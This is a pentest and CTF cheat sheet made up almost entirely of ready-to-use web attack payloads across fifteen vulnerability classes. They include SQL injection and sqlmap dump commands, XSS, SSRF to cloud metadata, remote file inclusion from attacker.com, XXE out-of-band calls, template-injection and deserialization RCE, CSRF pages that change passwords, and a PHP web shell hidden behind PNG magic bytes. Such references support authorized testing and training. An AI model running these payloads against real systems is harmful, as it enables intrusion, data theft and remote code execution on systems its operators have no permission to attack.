# Quick Web Exploit Testing Reference

A rapid-fire guide for testing common vulnerabilities during CTFs and pentests.

## 1. SQL Injection (SQLi)

**Quick Tests:**
```bash
# Basic detection
'
"
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
admin' OR '1'='1'--
admin' OR '1'='1'#

# Union-based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Error-based
'
"
`
')
")
`)

# Time-based blind
' OR SLEEP(5)--
' OR pg_sleep(5)--
```

**Where to test:**
- Login forms (username/password)
- Search bars
- URL parameters (?id=1)
- Cookie values
- HTTP headers (User-Agent, Referer)

**Screenshot checklist:**
- Error messages revealing DB type
- Successful bypass (logging in as admin)
- Union injection showing column count
- Data exfiltration

---

## 2. Cross-Site Scripting (XSS)

**Quick Tests:**
```html
# Basic payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>

# Event handlers
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>

# Bypass filters
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror="alert(1)">
<img src=x onerror='alert(1)'>
<img src=x onerror=alert`1`>

# Polyglots
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**Where to test:**
- Input fields (name, comment, search)
- URL parameters
- Referer/User-Agent headers
- File upload names
- Error messages

**Screenshot checklist:**
- Alert box firing
- Cookie theft payload
- DOM manipulation
- Filter bypass working

---

## 3. Server-Side Request Forgery (SSRF)

**Quick Tests:**
```bash
# Internal network
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://169.254.169.254  # AWS metadata
http://metadata.google.internal  # GCP metadata

# URL bypass techniques
http://127.1
http://127.0.1
http://0177.0.0.1  # Octal
http://0x7f.0x0.0x0.0x1  # Hex
http://localhost.evil.com
http://evil.com#localhost

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
```

**Where to test:**
- URL fetch/preview features
- Webhooks
- PDF generators
- Image/file imports
- API integrations

**Screenshot checklist:**
- Internal port scan results
- Metadata endpoint response
- File:// protocol reading /etc/passwd
- Bypass techniques working

---

## 4. Remote File Inclusion (RFI)

**Quick Tests:**
```bash
# Direct inclusion
http://attacker.com/shell.txt
http://attacker.com/shell.php
//attacker.com/shell.txt

# URL encoding
http%3A%2F%2Fattacker.com%2Fshell.txt

# Protocol wrappers (PHP)
php://input
php://filter/convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://whoami
```

**Where to test:**
- File inclusion parameters (?page=, ?file=, ?include=)
- Template engines
- PDF generators
- Image processing

**Screenshot checklist:**
- Remote file successfully included
- Shell execution
- Source code disclosure
- Error messages

---

## 5. Local File Inclusion (LFI)

**Quick Tests:**
```bash
# Basic traversal
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd

# Windows
../../../windows/system32/drivers/etc/hosts
C:\Windows\System32\drivers\etc\hosts

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
zip://shell.zip%23shell.php
phar://shell.phar/shell.php

# Logs poisoning
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/environ
```

**Where to test:**
- Same as RFI
- Download/view file features
- Template rendering

**Screenshot checklist:**
- /etc/passwd contents
- Source code via PHP filters
- Log poisoning working
- Path traversal successful

---

## 6. Command Injection

**Quick Tests:**
```bash
# Basic injection
; whoami
| whoami
|| whoami
& whoami
&& whoami
` whoami `
$( whoami )

# Newline injection
%0a whoami
%0d whoami

# Bypass filters
who\ami
w`ho`ami
w$()hoami
who$@ami

# Time-based detection
; sleep 5
| sleep 5
& ping -c 5 127.0.0.1
```

**Where to test:**
- Ping/network tools
- File operations
- System commands
- Image processing
- URL parameters

**Screenshot checklist:**
- Command output displayed
- Reverse shell connection
- Time delay confirming injection
- Bypass techniques working

---

## 7. XML External Entity (XXE)

**Quick Tests:**
```xml
# Basic XXE
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# Out-of-band XXE
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<root>&xxe;</root>

# Parameter entity
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<root></root>

# CDATA wrapper
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY start "<![CDATA[">
<!ENTITY end "]]>">
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&start;&xxe;&end;</root>
```

**Where to test:**
- XML upload/parsing
- SOAP endpoints
- SVG uploads
- RSS/Atom feeds
- SAML authentication

**Screenshot checklist:**
- File contents disclosed
- SSRF to internal services
- Error messages
- Out-of-band confirmation

---

## 8. Server-Side Template Injection (SSTI)

**Quick Tests:**
```python
# Detection
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}

# Jinja2/Flask
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig
{{_self.env.display("shell.txt")}}

# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }

# Velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
$rt.getRuntime().exec('whoami')
```

**Where to test:**
- Email templates
- Report generation
- Custom error pages
- User profile rendering
- Any user input in templates

**Screenshot checklist:**
- Math evaluation (49 from 7*7)
- Config disclosure
- RCE execution
- Template error messages

---

## 9. Insecure Deserialization

**Quick Tests:**
```python
# PHP
O:8:"stdClass":0:{}
O:8:"Evil":1:{s:4:"code";s:6:"whoami";}

# Java
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAU...

# Python pickle
cos\nsystem\n(S'whoami'\ntR.

# .NET
AAEAAAD/////AQAAAAAAAAAMAgAAAF...
```

**Tools:**
```bash
# ysoserial (Java)
java -jar ysoserial.jar CommonsCollections5 'whoami' | base64

# phpggc (PHP)
phpggc -b Monolog/RCE1 system whoami
```

**Where to test:**
- Session cookies
- Authentication tokens
- Data parameters
- File uploads
- API endpoints

**Screenshot checklist:**
- Serialized data identified
- Successful RCE
- Tool output
- Application behavior changes

---

## 10. Cross-Site Request Forgery (CSRF)

**Quick Tests:**
```html
# Basic CSRF PoC
<html>
  <body>
    <form action="http://target.com/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="submit" value="Submit" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>

# GET-based
<img src="http://target.com/delete-account?confirm=yes">

# JSON CSRF
<script>
fetch('http://target.com/api/change-password', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({password: 'hacked'})
});
</script>
```

**Where to test:**
- State-changing actions
- Password changes
- Email updates
- Transfers/purchases
- Account deletions

**Screenshot checklist:**
- Missing CSRF token
- Action performed without token
- PoC HTML page
- Burp request showing no protection

---

## 11. Directory Traversal

**Quick Tests:**
```bash
# Basic
../../../etc/passwd
..\..\..\windows\win.ini

# URL encoding
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding
..%252f..%252f..%252fetc%252fpasswd

# Null byte (older systems)
../../../etc/passwd%00
../../../etc/passwd%00.png

# Bypass filters
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
```

**Where to test:**
- File download features
- Image/document viewers
- Template includes
- File upload paths
- Export functionality

**Screenshot checklist:**
- Sensitive file contents
- Directory listing
- Bypass techniques
- Error messages

---

## 12. File Upload Vulnerabilities

**Quick Tests:**
```bash
# Extension bypasses
shell.php
shell.php5
shell.phtml
shell.phar
shell.php.jpg
shell.jpg.php
shell.php%00.jpg (null byte)

# Content-Type bypass
Upload shell.php but change:
Content-Type: image/png

# Magic bytes
Add PNG header to PHP shell:
\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>

# Double extensions
shell.jpg.php
shell.php.jpg

# Case variation
shell.PhP
shell.pHp
```

**Where to test:**
- Profile picture uploads
- Document uploads
- Import features
- Backup restore
- Avatar/logo uploads

**Screenshot checklist:**
- Successful shell upload
- Bypassed filters
- Shell execution
- File path disclosure

---

## 13. Business Logic Flaws

**Quick Tests:**
```bash
# Price manipulation
price=100 → price=-100
price=100 → price=0.01
quantity=1 → quantity=-1

# Race conditions
Send 100 simultaneous requests to:
- Redeem coupon
- Transfer money
- Use one-time token

# Parameter pollution
?user=victim&user=attacker
?role=user&role=admin

# Integer overflow
quantity=99999999999999999999

# Workflow bypass
/step1 → /step2 → /step3 → /complete
Try: /complete directly
```

**Where to test:**
- Payment flows
- Multi-step processes
- Discount/coupon systems
- Referral programs
- Rate limits

**Screenshot checklist:**
- Negative price checkout
- Bypassed workflow
- Race condition success
- Logic error exploited

---

## 14. Insecure Direct Object Reference (IDOR)

**Quick Tests:**
```bash
# Numeric IDs
/user/profile?id=123 → id=124, id=1, id=999

# Predictable patterns
/invoice/2024-001 → 2024-002, 2023-999

# GUIDs (try anyway)
/document/a8f5f167-f44b-4e11-b3f8-0c44298fc55c

# Encoded values
Base64: dXNlcjEyMw== → decode, change, re-encode

# Mixed with other params
/api/user?id=123&role=admin
```

**Where to test:**
- User profiles
- Documents/files
- API endpoints
- Order/invoice viewing
- Private messages

**Screenshot checklist:**
- Other user's data accessed
- Request/response showing IDOR
- Sensitive information leaked
- Authorization bypass

---

## 15. Open Redirect

**Quick Tests:**
```bash
# Basic
?redirect=http://evil.com
?url=//evil.com
?next=https://evil.com

# Bypass filters
?redirect=https://evil.com@target.com
?redirect=https://target.com.evil.com
?redirect=//evil.com
?redirect=/\/evil.com
?redirect=javascript:alert(1)

# Parameter pollution
?redirect=target.com&redirect=evil.com

# Encoded
?redirect=https%3A%2F%2Fevil.com
?redirect=%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%63%6F%6D
```

**Where to test:**
- Login redirects
- Logout redirects
- OAuth callbacks
- Language/locale changes
- External link warnings

**Screenshot checklist:**
- Redirect to evil.com
- Bypass technique working
- Phishing scenario
- URL in browser bar

---

## General Testing Workflow

1. **Intercept with Burp Suite** - See exactly what's being sent
2. **Test one parameter at a time** - Systematic approach
3. **Check error messages** - Often reveal vulnerability types
4. **Try encoding variations** - URL encode, double encode, etc.
5. **Document everything** - Screenshot both success AND failures
6. **Chain exploits** - XSS → Session stealing, SQLi → File write → RCE

## Screenshot Best Practices

**Good screenshots show:**
- The vulnerable parameter/input
- The payload used
- The response/output
- Proof of exploitation (flag, shell, data)

**Name them descriptively:**
- `01-sqli-detection.png` - Error message
- `02-sqli-union-bypass.png` - Finding column count
- `03-sqli-data-exfil.png` - Dumping credentials

## Quick Reference: What to Screenshot

✅ **Always capture:**
- Initial vulnerability discovery
- Payload that worked
- Exploitation result
- Privilege escalation

❌ **Don't need to screenshot:**
- Every failed attempt (just the interesting ones)
- Repetitive steps
- Common enumeration (unless unusual findings)

## Tools Cheat Sheet

```bash
# SQLi
sqlmap -u "http://target.com?id=1" --batch --dump

# XSS
echo "URL" | waybackurls | gf xss | uro | qsreplace '"><script>alert(1)</script>' | airixss -payload "confirm(1)"

# Command injection
commix --url="http://target.com?ip=" --batch

# Directory traversal
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd

# File upload
Upload with Burp, modify Content-Type and extension
```

---

Remember: **Document failed attempts too!** They show you tested thoroughly and understood the attack surface.
